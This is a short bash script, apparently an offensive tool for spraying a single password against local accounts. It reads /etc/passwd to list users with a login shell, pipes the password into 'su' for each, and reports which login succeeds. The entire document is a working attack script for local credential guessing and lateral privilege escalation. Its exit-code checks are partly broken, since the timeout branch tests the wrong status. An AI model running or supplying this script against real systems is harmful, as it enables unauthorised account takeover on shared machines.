#!/bin/bash

# Tool for spraying single password across valid users with su

# users=$(cat /etc/passwd | grep sh$ | awk -F: '{print $l}')

# users=$(awk '$NF ~ /sh$/' /etc/passwd)


do_spray ()
{
  users=$(awk -F: '{ if ($NF ~ /sh$/)  print $1 }' /etc/passwd)
  for user in $users; do
    echo $1 | timeout 2 su $user -c whoami 2>/dev/null
    if [[ $? -eq 0 ]]; then
      echo "$user SUCCESS"
      return
    elif [[ $? -eq 124 ]]; then
      echo "$user DENY"
    else
      echo "$user $?"
    fi
  done
}

do_spray $1
